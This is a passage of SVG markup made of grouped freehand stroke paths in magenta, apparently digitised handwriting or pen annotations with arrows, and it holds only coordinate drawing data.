<path d="M1300.43 682.03 L1299.74 682.38 L1298.94 682.86 L1297.82 684.10 L1296.65 685.47 L1295.53 686.96 L1294.99 687.73 L1293.87 689.87 L1293.34 691.05 L1293.07 692.06 L1292.91 693.19 L1293.07 694.26 L1293.87 694.56 L1295.53 692.42 L1296.38 690.70 L1297.02 689.39 L1297.45 688.44 L1297.87 687.55 L1297.71 688.50 L1297.66 689.51 L1297.71 690.58 L1297.87 691.83 L1298.25 693.25 L1298.67 694.74 L1299.15 695.93 L1299.79 696.64 L1300.75 697.17 L1301.98 696.99 L1303.37 695.03 L1303.85 694.14 L1304.11 693.25 L1304.49 691.83 L1304.75 690.76 L1304.91 689.63 L1304.54 690.40 L1304.75 691.23 L1305.34 692.96 L1305.98 694.86 L1306.62 696.64 L1307.26 698.42 L1307.85 699.85 L1308.27 701.09 L1308.65 701.98 L1308.91 702.82 L1309.29 703.65 L1309.29 703.65" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1316.59 696.34 L1316.01 695.63 L1315.42 695.09 L1314.67 694.74 L1313.66 694.86 L1313.02 695.27 L1312.59 696.04 L1312.27 697.05 L1312.38 698.42 L1312.70 699.25 L1313.45 699.91 L1314.30 700.14 L1315.31 699.85 L1315.95 699.13 L1316.27 698.06 L1316.49 697.11 L1316.81 696.10 L1317.18 696.99 L1317.61 698.36 L1317.93 700.38 L1318.35 702.34 L1318.51 703.29 L1318.73 704.95 L1318.94 706.32 L1319.05 707.51 L1319.05 708.93 L1318.89 710.12 L1318.57 710.95 L1317.93 711.55 L1317.18 711.19 L1316.65 710.54 L1316.49 709.53 L1316.97 708.58 L1318.73 706.97 L1320.22 705.85 L1321.87 704.66 L1323.63 703.41 L1325.18 702.16 L1326.67 700.86 L1327.31 700.20 L1327.90 699.61 L1328.70 698.54 L1329.13 697.71 L1329.18 696.58 L1328.54 695.69 L1327.85 695.21 L1326.99 694.97 L1325.93 695.33 L1325.23 695.98 L1324.49 697.53 L1324.06 699.01 L1323.95 700.26 L1324.11 701.45 L1324.54 702.99 L1325.23 704.72 L1326.19 706.08 L1327.05 707.09 L1327.90 707.69 L1327.90 707.69" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1338.14 688.62 L1337.61 689.51 L1337.29 691.17 L1336.86 694.62 L1336.59 696.94 L1336.43 699.07 L1336.38 700.80 L1336.22 702.16 L1336.22 703.59 L1336.22 703.59" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1081.45 824.29 L1081.18 825.24 L1082.67 826.37 L1084.91 827.02 L1087.90 827.32 L1094.09 827.02 L1096.86 826.67 L1102.67 825.66 L1109.34 824.23 L1116.17 822.45 L1123.05 820.37 L1130.03 817.99 L1138.35 814.85 L1145.02 812.00 L1152.49 808.31 L1159.10 804.93 L1166.03 800.89 L1172.27 797.14 L1178.09 793.58 L1183.74 790.02 L1189.29 786.57 L1194.35 783.30 L1198.73 780.63 L1202.94 777.96 L1206.83 775.40 L1208.70 774.10 L1212.22 771.60 L1215.15 769.40 L1219.10 766.37 L1221.18 764.65 L1222.94 763.17 L1224.49 761.92 L1225.82 760.73 L1227.10 759.66 L1229.07 758.30 L1230.25 757.58 L1231.42 757.05 L1232.33 756.57 L1233.13 756.22 L1234.09 755.80 L1234.99 755.62 L1235.95 755.74 L1236.81 755.98 L1238.57 756.40 L1240.22 756.75 L1241.55 757.05 L1242.62 757.23 L1243.74 757.46 L1243.74 757.46" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1234.57 750.28 L1234.09 749.62 L1234.89 749.09 L1236.06 749.03 L1238.14 749.27 L1240.22 749.62 L1241.07 749.86 L1242.83 750.46 L1243.95 751.17 L1244.81 751.88 L1245.23 752.71 L1245.55 753.60 L1245.02 756.40 L1243.90 758.53 L1243.05 759.66 L1240.65 761.98 L1239.26 763.11 L1239.26 763.11" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1082.83 823.34 L1082.03 823.04 L1081.02 822.81 L1079.95 822.75 L1078.89 822.75 L1076.86 822.81 L1074.35 822.75 L1071.85 822.75 L1069.13 822.69 L1067.74 822.57 L1063.47 822.51 L1060.43 822.45 L1057.34 822.39 L1054.14 822.33 L1050.83 822.33 L1047.53 822.21 L1044.22 822.33 L1040.86 822.39 L1039.31 822.45 L1035.74 822.57 L1032.54 822.81 L1029.55 822.98 L1025.39 823.16 L1022.89 823.22 L1020.65 823.34 L1018.78 823.22 L1017.23 823.10 L1016.17 823.04 L1015.15 822.98 L1013.50 822.75 L1012.11 822.51 L1010.89 822.39 L1009.82 822.21 L1008.91 822.09 L1007.63 821.86 L1006.41 821.68 L1004.54 821.50 L1003.58 821.38 L1001.93 821.14 L1000.59 821.02 L999.53 820.91 L998.25 820.73 L997.29 820.61 L996.27 820.43 L996.27 820.43" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1271.15 794.89 L1271.79 795.42 L1272.11 796.43 L1272.43 798.81 L1272.33 801.30 L1272.22 802.61 L1271.79 805.46 L1271.15 808.67 L1269.98 812.23 L1268.65 815.86 L1266.78 820.01 L1264.70 824.23 L1262.51 828.39 L1260.11 832.55 L1257.50 836.47 L1256.06 838.49 L1253.07 842.29 L1249.98 845.79 L1245.13 850.84 L1241.82 853.81 L1238.46 856.55 L1235.42 858.92 L1232.43 861.00 L1231.05 861.95 L1228.27 863.67 L1225.45 865.22 L1222.83 866.64 L1220.33 867.71 L1217.82 868.66 L1215.21 869.61 L1211.26 870.74 L1208.65 871.40 L1207.31 871.69 L1204.70 872.23 L1202.09 872.76 L1199.79 873.24 L1197.61 873.71 L1196.43 873.83 L1194.73 874.07 L1193.23 874.25 L1191.85 874.43 L1190.73 874.48 L1189.55 874.54 L1188.49 874.60 L1187.05 874.60 L1185.82 874.54 L1184.54 874.48 L1184.54 874.48" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M903.58 856.13 L903.90 855.30 L903.37 857.97 L902.67 861.12 L902.25 862.84 L901.23 866.53 L900.22 870.09 L899.53 873.42 L898.89 876.15 L898.30 878.64 L897.87 880.54 L897.55 881.91 L897.45 882.86 L897.98 881.49 L898.67 878.46 L899.42 874.84 L900.38 870.92 L901.39 866.94 L902.46 863.44 L903.47 860.29 L904.22 857.79 L904.97 855.77 L905.18 854.94 L905.61 853.69 L906.03 852.86 L906.46 853.64 L906.83 855.18 L907.26 857.91 L907.74 861.06 L908.33 864.56 L908.97 868.01 L909.55 871.16 L910.14 873.95 L910.62 876.39 L910.99 878.35 L911.26 879.71 L911.31 880.78 L911.31 880.78" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M904.22 870.45 L903.74 869.67 L903.26 868.84 L903.15 867.83 L904.01 867.59 L905.34 867.59 L908.33 867.36 L910.35 866.88 L910.35 866.88" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M920.65 853.58 L920.86 852.68 L920.65 853.75 L920.65 857.26 L920.75 860.17 L920.86 863.14 L921.07 866.23 L921.39 869.08 L921.61 870.45 L921.93 873.06 L922.30 875.32 L922.51 876.33 L922.94 878.94 L922.89 879.95 L922.25 879.30 L921.61 878.23 L920.59 876.62 L920.17 875.79 L919.79 875.02 L919.31 873.83 L918.94 872.82 L918.78 871.63 L919.10 870.62 L920.59 869.32 L922.25 868.37 L923.95 867.65 L924.75 867.30 L925.98 866.82 L926.99 866.47 L927.74 866.17 L928.75 865.87 L928.33 868.07 L927.53 870.09 L926.89 872.05 L926.62 873.06 L926.19 874.60 L925.87 875.91 L925.82 876.92 L925.82 877.99 L926.25 878.70 L927.05 878.35 L927.69 877.75 L928.17 876.92 L929.02 875.44 L929.55 874.19 L929.93 873.12 L930.35 872.05 L930.62 871.28 L930.83 870.39 L930.99 871.51 L931.21 872.41 L931.47 873.36 L932.01 874.19 L932.01 874.19" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M940.22 869.91 L939.74 869.20 L938.67 869.20 L936.91 870.09 L935.47 871.04 L934.14 872.35 L933.18 873.71 L932.54 874.84 L932.27 876.03 L932.33 877.04 L932.65 878.05 L933.34 879.18 L934.57 880.37 L935.21 880.78 L936.65 881.14 L938.03 881.14 L938.03 881.14" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M951.47 858.86 L950.67 858.51 L949.98 859.04 L948.97 860.64 L948.11 862.60 L947.42 864.86 L946.83 867.36 L946.46 870.03 L946.19 872.70 L946.09 875.32 L946.09 876.62 L946.09 879.12 L946.41 881.43 L946.73 883.45 L946.73 883.45" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M954.57 874.54 L953.55 874.13 L952.33 874.19 L951.58 874.78 L950.83 875.85 L950.14 877.22 L949.77 878.58 L949.61 879.77 L949.61 880.84 L949.82 881.79 L950.14 882.62 L950.89 883.69 L951.58 884.29 L952.65 885.06 L953.77 885.41 L954.94 885.41 L956.86 884.58 L958.46 883.28 L959.79 881.61 L960.75 879.77 L961.39 878.05 L961.66 876.68 L961.71 875.61 L961.39 874.48 L960.65 873.89 L959.42 874.07 L958.46 874.90 L957.29 876.33 L956.59 878.23 L956.38 879.06 L956.27 880.72 L957.02 883.34 L957.87 885.06 L958.99 886.48 L960.33 887.61 L960.97 888.03 L962.14 888.50 L963.31 888.56 L965.23 887.97 L966.67 886.90 L968.06 885.30 L969.13 883.45 L970.03 881.49 L970.83 879.71 L971.10 878.94 L971.47 877.69 L971.79 876.74 L972.06 875.67 L972.27 874.66 L972.75 875.44 L972.97 876.27 L973.45 877.63 L973.87 879.53 L974.41 881.73 L974.99 883.81 L975.58 885.77 L976.17 887.61 L976.70 888.98 L977.66 890.82 L978.25 891.41 L979.15 891.83 L980.97 891.41 L982.89 890.40 L985.02 889.10 L986.09 888.38 L986.09 888.38" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M949.55 915.06 L949.34 916.84 L949.07 919.63 L948.75 922.78 L948.49 926.28 L948.49 929.55 L948.49 931.21 L948.70 934.36 L949.34 938.76 L950.03 941.25 L950.89 943.33 L951.90 945.05 L952.97 946.18 L954.09 946.66 L954.99 946.42 L956.49 945.17 L957.66 943.51 L959.74 939.94 L960.81 937.81 L961.29 936.92 L961.71 936.02 L961.61 937.09 L961.18 939.35 L960.86 940.95 L960.75 942.38 L960.65 943.63 L960.65 944.99 L960.86 945.83 L960.86 945.83" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M963.05 924.86 L962.62 924.08 L961.71 924.50 L961.71 924.50" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M967.95 933.23 L967.10 933.53 L966.03 933.71 L965.18 934.06 L964.59 934.66 L964.22 935.37 L964.38 936.50 L965.55 938.70 L966.46 939.94 L966.89 940.60 L967.74 941.67 L969.29 943.63 L969.98 944.64 L970.62 945.41 L971.05 946.12 L971.47 947.13 L971.42 948.20 L970.67 948.80 L969.77 948.56 L969.39 947.73 L969.98 944.99 L970.41 943.63 L970.41 943.63" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M979.95 924.98 L979.53 925.93 L979.15 927.65 L978.89 930.02 L978.67 932.58 L978.46 936.50 L978.51 937.81 L978.57 940.24 L978.67 942.50 L978.73 944.10 L978.78 945.41 L978.89 946.42 L978.73 947.49 L978.14 947.01 L976.86 944.40 L975.95 942.56 L975.15 940.84 L974.57 939.53 L974.19 938.52 L973.98 937.51 L974.57 937.03 L975.95 937.09 L977.50 937.33 L979.74 937.63 L981.66 937.69 L983.37 937.69 L986.30 937.27 L987.31 937.09 L989.13 936.38 L990.57 935.55 L991.47 934.54 L992.06 933.47 L992.43 932.46 L992.54 931.21 L992.27 930.32 L991.15 930.50 L989.71 931.63 L988.38 933.17 L987.31 934.84 L986.51 936.44 L986.09 937.81 L985.87 938.99 L985.82 939.94 L985.87 941.19 L986.09 942.20 L986.41 942.97 L986.78 943.75 L987.42 944.34 L988.33 944.64 L989.39 944.58 L989.39 944.58" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M997.55 932.28 L997.71 931.27 L997.87 932.46 L997.87 933.65 L997.87 935.91 L997.93 938.10 L998.03 939.89 L998.14 941.31 L998.30 942.38 L998.46 943.63 L998.73 944.40 L999.31 943.63 L999.95 942.26 L1000.22 941.49 L1000.75 940.18 L1001.23 939.23 L1001.61 938.16 L1001.93 937.39 L1002.46 938.04 L1002.73 939.11 L1002.89 940.18 L1003.05 941.19 L1003.15 942.32 L1003.37 943.39 L1003.53 944.40 L1003.79 945.35 L1004.17 946.36 L1004.81 946.84 L1005.77 947.01 L1006.67 946.72 L1007.85 946.12 L1009.34 944.99 L1010.03 944.28 L1011.26 942.86 L1012.65 940.24 L1012.97 939.35 L1013.45 937.75 L1013.71 936.44 L1013.77 935.43 L1013.71 934.48 L1012.97 933.89 L1011.37 934.90 L1009.55 936.97 L1008.70 938.46 L1008.38 939.41 L1008.06 940.95 L1007.90 942.38 L1008.06 943.63 L1008.33 944.70 L1008.70 945.65 L1009.18 946.36 L1009.71 947.13 L1010.67 947.96 L1011.63 948.50 L1013.07 948.50 L1014.78 947.61 L1015.53 947.13 L1016.70 945.71 L1017.82 944.04 L1018.67 942.50 L1018.99 941.67 L1019.42 940.48 L1019.79 939.53 L1020.11 938.58 L1019.85 939.59 L1020.01 940.66 L1020.33 942.20 L1020.54 943.03 L1020.97 944.58 L1021.66 946.18 L1022.25 947.49 L1022.94 948.50 L1023.58 949.33 L1024.11 949.98 L1024.59 950.58 L1025.18 951.23 L1025.77 951.88 L1026.19 952.48 L1026.51 953.37 L1026.51 953.37" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1043.79 948.44 L1043.79 948.44" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1055.26 946.78 L1056.22 946.54 L1057.13 946.42 L1057.13 946.42" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1072.33 948.14 L1073.34 948.20 L1073.34 948.20" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1081.02 949.69 L1081.02 949.69" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1175.79 875.85 L1174.78 875.91 L1172.11 876.98 L1169.29 877.93 L1165.66 879.18 L1158.67 881.55 L1153.50 883.10 L1148.11 884.64 L1145.39 885.36 L1139.15 886.78 L1132.43 888.33 L1125.61 889.75 L1118.78 891.00 L1112.33 892.13 L1106.25 893.02 L1100.38 893.85 L1094.83 894.56 L1092.11 894.92 L1085.13 895.81 L1080.97 896.40 L1077.07 897.00 L1073.77 897.35 L1070.94 897.77 L1068.38 898.07 L1066.25 898.36 L1064.59 898.48 L1063.37 898.72 L1062.09 898.84 L1061.02 898.90 L1060.11 899.08 L1059.21 899.26 L1058.25 899.43 L1057.23 899.61 L1056.22 899.79 L1055.15 899.97 L1054.19 900.15 L1053.13 900.27 L1052.22 900.44 L1051.37 900.62 L1050.35 900.68 L1049.29 900.80 L1049.29 900.80" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1052.86 892.72 L1052.06 892.48 L1049.71 893.61 L1047.69 894.74 L1045.61 896.05 L1044.54 896.76 L1042.51 898.25 L1039.90 900.68 L1038.51 902.46 L1037.55 904.19 L1037.13 905.08 L1036.91 906.56 L1037.71 908.70 L1039.15 910.24 L1040.22 910.90 L1043.15 912.15 L1046.67 913.21 L1050.62 914.22 L1056.65 915.23 L1060.59 915.77 L1064.01 916.13 L1064.01 916.13" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1166.35 905.49 L1166.25 906.50 L1165.61 906.09 L1164.97 905.67 L1164.17 905.31 L1163.26 905.02 L1162.09 904.84 L1161.18 905.08 L1160.86 905.85 L1161.45 907.87 L1162.25 909.95 L1163.10 912.03 L1163.53 913.16 L1164.70 916.42 L1165.18 918.38 L1165.39 919.27 L1165.61 920.82 L1165.66 922.07 L1165.66 923.13 L1165.39 924.44 L1164.81 925.33 L1164.06 925.99 L1163.10 926.16 L1162.09 925.99 L1161.23 925.69 L1160.59 925.27 L1160.38 924.44 L1160.97 923.73 L1162.03 923.07 L1163.79 922.07 L1165.66 921.00 L1167.63 919.93 L1169.55 918.86 L1171.26 917.73 L1172.81 916.60 L1173.45 915.95 L1174.35 914.94 L1174.94 913.99 L1175.31 913.10 L1175.21 911.91 L1174.83 911.08 L1174.19 910.66 L1173.02 910.66 L1171.85 911.61 L1170.73 912.98 L1169.98 914.46 L1169.71 915.23 L1169.50 916.66 L1169.50 918.03 L1169.71 919.75 L1170.35 921.65 L1171.21 923.37 L1172.22 924.80 L1173.87 926.34 L1174.94 927.00 L1176.01 927.35 L1176.01 927.35" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1187.21 916.90 L1186.99 915.83 L1186.57 915.06 L1185.98 914.40 L1185.34 913.87 L1184.38 913.51 L1183.26 913.39 L1182.25 913.75 L1181.87 914.58 L1181.87 915.89 L1182.03 917.19 L1182.19 918.26 L1182.41 919.39 L1182.62 920.64 L1182.73 921.83 L1182.73 923.07 L1182.73 924.32 L1182.51 925.57 L1182.25 926.64 L1181.82 927.59 L1181.29 928.24 L1180.33 928.36 L1179.53 927.95 L1179.58 926.70 L1181.07 925.04 L1182.51 923.73 L1184.33 922.36 L1186.03 921.06 L1187.69 919.99 L1189.07 919.04 L1190.03 918.38 L1190.83 917.91 L1191.58 917.31 L1190.73 917.13 L1190.14 917.67 L1189.55 918.38 L1189.18 919.33 L1189.07 920.40 L1189.13 921.47 L1190.19 924.80 L1190.73 925.99 L1191.21 927.00 L1191.63 927.89 L1192.01 928.60 L1192.33 929.49 L1192.54 930.38 L1192.33 931.51 L1191.85 932.28 L1191.26 932.94 L1190.41 933.17 L1189.93 932.52 L1190.62 930.80 L1191.63 929.07 L1192.22 928.12 L1193.50 926.40 L1194.73 924.80 L1195.85 923.37 L1196.86 922.18 L1197.50 921.41 L1198.09 920.76 L1198.67 920.10 L1199.10 921.00 L1198.57 923.55 L1198.09 925.87 L1197.45 929.31 L1197.23 930.32 L1197.02 931.99 L1196.91 933.35 L1196.86 934.36 L1197.18 935.37 L1197.18 935.37" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1202.73 919.27 L1202.67 917.97 L1202.51 917.02 L1202.46 915.95 L1202.46 915.95" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1210.19 921.17 L1209.50 921.71 L1208.75 922.36 L1207.31 923.73 L1206.03 925.45 L1205.13 927.35 L1204.38 929.49 L1204.06 931.75 L1203.95 932.76 L1204.11 934.48 L1204.33 935.79 L1204.59 936.92 L1204.97 937.75 L1205.55 938.52 L1206.19 938.99 L1206.78 938.46 L1207.53 936.44 L1208.27 933.83 L1208.65 930.74 L1208.91 927.47 L1209.13 923.13 L1209.18 920.82 L1209.29 919.21 L1209.39 918.03 L1209.71 917.25 L1210.19 916.66 L1211.26 916.90 L1212.43 918.03 L1213.45 919.63 L1213.93 920.40 L1215.15 923.37 L1215.79 925.51 L1216.22 927.59 L1216.49 929.55 L1216.59 931.27 L1216.59 932.82 L1216.43 934.00 L1216.27 935.01 L1216.17 936.14 L1217.07 933.89 L1218.09 931.57 L1218.73 930.44 L1220.17 928.24 L1221.87 925.93 L1223.53 924.08 L1225.13 922.54 L1225.93 922.01 L1227.05 921.29 L1228.22 921.29 L1228.75 922.12 L1228.91 923.07 L1229.29 925.15 L1229.55 927.23 L1229.77 929.43 L1229.98 931.51 L1230.14 932.46 L1230.25 934.06 L1230.51 935.55 L1230.51 935.55" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M627.63 1846.98 L628.59 1847.15 L629.60 1846.98 L630.56 1846.68 L632.06 1846.20 L633.76 1845.25 L635.47 1844.12 L637.07 1843.00 L638.51 1841.75 L639.74 1840.44 L640.22 1839.73 L640.96 1838.48 L641.18 1837.41 L641.07 1836.40 L640.80 1835.57 L640.38 1834.92 L639.79 1834.44 L638.94 1833.91 L637.98 1833.79 L636.91 1833.85 L636.00 1834.20 L634.56 1835.57 L633.87 1836.64 L633.39 1837.71 L633.28 1838.78 L633.34 1840.20 L634.19 1842.52 L634.99 1844.01 L635.95 1845.25 L636.80 1846.09 L637.66 1846.68 L637.66 1846.68" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M645.44 1838.24 L644.96 1838.96 L644.64 1839.79 L644.59 1840.80 L644.54 1841.81 L644.64 1842.82 L644.80 1843.95 L645.12 1845.02 L645.39 1846.09 L645.39 1846.09" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M646.30 1843.29 L645.55 1844.01 L643.95 1845.55 L642.46 1847.04 L640.75 1849.06 L640.75 1849.06" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M652.22 1836.70 L651.47 1837.35 L650.19 1839.08 L649.60 1840.38 L649.39 1841.57 L649.39 1842.82 L649.92 1844.84 L650.62 1846.56 L651.47 1848.10 L652.43 1849.47 L653.28 1850.42 L654.08 1851.13 L654.08 1851.13" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M649.71 1846.09 L650.24 1845.55 L651.04 1844.90 L651.84 1844.24 L652.48 1843.65 L652.96 1843.12 L653.39 1842.46 L653.71 1841.51 L653.66 1840.50 L653.39 1839.49 L652.75 1839.08 L651.90 1839.37 L651.90 1839.37" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M658.08 1839.31 L657.34 1839.67 L656.80 1840.15 L656.16 1840.92 L655.79 1841.93 L655.68 1842.94 L656.48 1845.08 L656.91 1845.73 L657.76 1846.74 L658.78 1847.27 L659.79 1847.51 L659.79 1847.51" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M667.31 1838.84 L666.88 1839.73 L666.67 1840.56 L666.51 1841.51 L666.62 1842.58 L666.99 1843.29 L667.47 1843.89 L668.16 1844.24 L669.39 1844.24 L670.14 1843.89 L670.78 1843.47 L671.36 1842.88 L671.90 1842.28 L672.48 1842.88 L672.48 1844.01 L672.54 1845.31 L672.86 1846.26 L673.18 1847.04 L673.18 1847.04" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M682.40 1834.09 L682.08 1834.98 L681.44 1837.06 L680.59 1840.56 L680.16 1843.12 L679.84 1845.55 L679.63 1847.81 L679.58 1848.82 L679.42 1850.54 L679.42 1851.85 L679.36 1852.86 L679.20 1854.04 L678.03 1851.79 L677.44 1849.41 L677.02 1847.04 L676.70 1844.96 L676.70 1843.35 L676.91 1842.22 L677.34 1841.21 L678.14 1840.80 L679.36 1840.92 L681.07 1841.51 L682.94 1842.16 L683.95 1842.40 L684.80 1842.64 L686.40 1842.94 L687.74 1843.12 L688.91 1843.00 L689.82 1842.82 L690.62 1842.46 L691.26 1841.87 L691.68 1840.86 L691.79 1839.73 L691.58 1838.60 L691.20 1837.71 L690.35 1837.35 L689.07 1838.24 L687.74 1839.79 L686.67 1841.69 L685.87 1843.71 L685.39 1845.79 L685.60 1848.76 L686.46 1850.78 L687.90 1852.38 L688.80 1853.21 L688.80 1853.21" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M530.24 1797.97 L530.03 1797.08 L529.82 1797.97 L529.82 1800.94 L529.82 1803.61 L529.82 1807.53 L529.92 1810.15 L529.98 1812.58 L530.14 1813.71 L530.19 1815.55 L530.24 1817.10 L530.35 1818.23 L530.46 1819.47 L530.67 1820.31 L531.10 1819.30 L531.84 1817.28 L532.27 1816.15 L533.12 1814.07 L534.08 1812.23 L534.72 1810.92 L535.20 1809.97 L535.68 1809.43 L536.48 1809.14 L537.12 1809.61 L537.50 1810.33 L537.71 1811.28 L537.76 1812.40 L537.34 1815.14 L536.64 1817.16 L535.84 1818.94 L534.83 1820.42 L533.92 1821.37 L532.96 1821.79 L531.90 1821.37 L531.47 1820.60 L531.47 1820.60" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M543.74 1810.92 L543.58 1812.35 L543.68 1813.71 L543.79 1814.96 L544.00 1815.79 L544.43 1816.44 L545.44 1816.56 L546.62 1815.43 L547.04 1814.66 L547.63 1813.30 L548.38 1811.39 L548.70 1810.50 L548.91 1811.39 L549.12 1815.02 L549.18 1816.15 L549.18 1817.22 L549.12 1819.12 L548.91 1821.73 L548.59 1823.69 L548.38 1824.58 L547.84 1826.25 L547.15 1827.61 L546.51 1828.56 L545.87 1829.22 L544.80 1829.39 L543.95 1828.86 L543.52 1828.21 L543.36 1827.02 L543.36 1827.02" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M561.87 1804.27 L561.82 1805.45 L561.60 1806.82 L561.44 1807.77 L561.23 1809.85 L561.02 1811.75 L560.86 1813.41 L560.75 1814.84 L560.59 1816.09 L560.43 1817.10 L560.22 1818.34 L559.95 1819.18 L559.10 1818.88 L558.56 1817.39 L558.14 1815.79 L557.87 1814.60 L557.66 1813.59 L557.71 1812.52 L558.30 1811.93 L559.36 1811.99 L560.38 1812.23 L561.82 1812.52 L562.72 1812.64 L564.32 1812.94 L565.66 1813.00 L566.83 1813.00 L568.11 1812.76 L568.75 1812.35 L569.34 1811.57 L569.50 1810.56 L569.39 1809.43 L568.96 1808.78 L568.16 1809.14 L567.04 1811.04 L566.30 1813.06 L566.03 1815.32 L566.40 1818.58 L567.42 1820.78 L569.34 1822.98 L570.46 1823.81 L570.46 1823.81" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M521.60 1721.28 L520.96 1721.76 L520.27 1722.41 L519.42 1723.78 L518.67 1725.44 L517.92 1727.10 L517.55 1728.59 L517.44 1729.96 L517.50 1731.03 L517.76 1731.98 L518.30 1732.69 L518.88 1733.16 L519.79 1733.52 L521.02 1733.40 L521.71 1732.87 L522.14 1732.09 L522.30 1731.03 L522.14 1729.96 L521.60 1728.35 L521.23 1727.64 L520.80 1726.39 L520.48 1725.50 L520.22 1724.73 L520.22 1723.60 L520.59 1722.83 L521.23 1722.29 L522.03 1721.88 L522.88 1721.52 L523.68 1721.22 L524.80 1721.22 L525.76 1721.64 L526.30 1722.35 L526.72 1723.18 L527.10 1724.19 L527.26 1725.44 L527.31 1726.63 L527.42 1727.82 L527.52 1728.71 L527.68 1729.78 L528.16 1730.37 L529.12 1730.07 L529.76 1729.60 L530.99 1728.23 L531.79 1727.22 L532.32 1726.51 L532.91 1725.80 L533.12 1726.75 L532.91 1727.88 L532.86 1729.01 L533.07 1730.07 L533.07 1730.07" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" 